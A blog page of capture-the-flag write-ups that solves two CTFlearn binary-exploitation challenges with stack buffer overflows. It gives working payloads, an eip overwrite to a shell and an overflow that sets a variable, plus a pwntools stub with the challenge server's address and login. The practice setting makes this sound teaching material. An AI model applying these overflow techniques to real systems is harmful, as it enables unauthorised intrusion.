---
title: "CTFlearn PWN Writeups"
permalink: "/ctflearn-pwn"
---

I plan to just keep adding PWN writeups here from [CTFlearn](https://ctflearn.com/).

1. [Favorite Color](#favorite-color-60-pts)
2. [Blackbox](#blackbox-80-pts-hard)

## Favorite Color [60 PTS Medium]

Source code is provided:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vuln() {
    char buf[32];

    printf("Enter your favorite color: ");
    gets(buf);

    int good = 0;
    for (int i = 0; buf[i]; i++) {
        good &= buf[i] ^ buf[i];
    }

    return good;
}

int main(char argc, char** argv) {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());

    //disable buffering.
    setbuf(stdout, NULL);

    if (vuln()) {
        puts("Me too! That's my favorite color too!");
        puts("You get a shell! Flag is in flag.txt");
        system("/bin/sh");
    } else {
        puts("Boo... I hate that color! :(");
    }
}
```

We can see that `good` will always be 0 because if you `XOR` anything with itself it returns 0, and when you `AND` anything with 0, it will also return 0.

```c
int good = 0;
for (int i = 0; buf[i]; i++) {
    good &= buf[i] ^ buf[i];
}
```
Since `vuln` always returns 0, this check will never pass:

```c
if (vuln()) {
    puts("Me too! That's my favorite color too!");
    puts("You get a shell! Flag is in flag.txt");
    system("/bin/sh");
}
```

However we can see that there is a `buffer overflow` on this line:

```c
gets(buf);
```

We can use this `buffer overflow` to overwrite the saved `eip` on the stack. 

Since we can change the saved `eip`, we can make the program skip the `if (vuln())` check.

Open the program up in `GDB` and find the offset from our input to the saved `eip`:

![saved eip offset](/assets/ctflearn/pwn/favorite-color/gdb_eip_offset.png)

We can see that we need 52 junk bytes and then our address to overwrite the saved `eip`.

Find the address of the instruction after the `if (vuln())` check:

![address of next instruction](/assets/ctflearn/pwn/favorite-color/if_addr.png)

We can see that the `if (vuln())` check is happening on address `0x08048655`, so we'll set the saved `eip` to the address after that, `0x08048657`.

> ``📝:`` To get this view just type `disassemble main`, where `main` can be any function you want to disassemble. 

Keep in mind that x86 uses [little endian](https://stackoverflow.com/a/25939262), so bytes are stored in reverse order.

Our final payload:

```sh
echo -e 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x57\x86\x04\x08' > /tmp/script/payload
```

The `-e` is to enable interpretation of backslash escapes. 

Now we can do `(cat /tmp/script/payload; cat) | ./color` to send the payload to the binary. 

> ``📝:`` We need to do `(cat x; cat)` because if we don't, then `stdin` will close, and we can't type anything else.

Running this, we get the flag:

```sh
color@ubuntu-512mb-nyc3-01:~$ (cat /tmp/script/payload; cat) | ./color
Enter your favorite color: Me too! That's my favorite color too!
You get a shell! Flag is in flag.txt
cat flag.txt
flag{REDACTED}
```

## Blackbox [80 PTS Hard]

First open it up in `GDB` to do some reverse engineering:

```sh
blackbox@ubuntu-512mb-nyc3-01:~$ gdb blackbox
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
blackbox: No such file or directory.
(gdb) r
Starting program:
No executable file specified.
Use the "file" or "exec-file" command.
(gdb)
```

Oh it doesn't work? `GDB` is blocked in this challenge unfortunately. 

The next thing I decided to do was to see if I could make the program segfault. 

```sh
blackbox@ubuntu-512mb-nyc3-01:~$ python -c 'print("1"*100)' | ./blackbox
What is 1 + 1 = No dummy... 1 + 1 != 825307441...
*** stack smashing detected ***: <unknown> terminated
```

Looks like there's a `stack canary` and there are some weird numbers. Maybe those numbers mean something. Converting those numbers from decimal to hex gives us this:

![decimal to hex](/assets/ctflearn/pwn/blackbox/decimal_to_hex.png)


That looks like ascii. Converting to ascii:

![hex to ascii](/assets/ctflearn/pwn/blackbox/hex_to_ascii.png)

Those are the ones from this command `python -c 'print("1"*100)' | ./blackbox`.

Lets try to reduce the number of ones until that weird number doesn't show up: 

```sh
blackbox@ubuntu-512mb-nyc3-01:~$ python -c 'print("1"*80)' | ./blackbox
What is 1 + 1 = No dummy... 1 + 1 != 0...
```
80 seems like the sweetspot.

When we do 81 it outputs:

```sh
blackbox@ubuntu-512mb-nyc3-01:~$ python -c 'print("1"*81)' | ./blackbox
What is 1 + 1 = No dummy... 1 + 1 != 49...
```

When we convert 49 to hex and then to `ascii` gives us 1 again. So I am assuming that there is some `answer` variable that we aren't writing into with our input. So to write into that we are utilizing a `buffer overflow` to write into the `answer` variable. 

We want `answer` to have the value 2, so lets write 80 junk bytes and then the value 2:

```sh
blackbox@ubuntu-512mb-nyc3-01:~$ python -c 'print(b"1"*80+b"2")' | ./blackbox
What is 1 + 1 = No dummy... 1 + 1 != 50...
```

... Why didn't it work?

Well we can assume that whatever is taking our input isn't taking it as an integer, so when it overwrites the `answer` variable it takes the byte representation of the character we put in. 

So all we have to do is send the actual byte `\x02`, in order for the `answer` variable to become 2.

```sh
blackbox@ubuntu-512mb-nyc3-01:~$ python -c 'print(b"1"*80+b"\x02")' | ./blackbox
What is 1 + 1 = CORRECT! You get flag:
flag{REDACTED}
```

And we got the flag!!!

If you want to use pwntools to interact with the binary you can do that!

```sh
from pwn import *

target = ssh(host='104.131.79.111', user='blackbox', password='guest', port=1001)
p = target.process(['/home/blackbox/blackbox'])

payload = # add whatever your payload is

#interact with the program like normal 
```

I won't show you the whole script because that feels too easy, but with this writeup, you should be able to complete the script!



I'll keep adding more writeups for pwn challenges here when I do them.

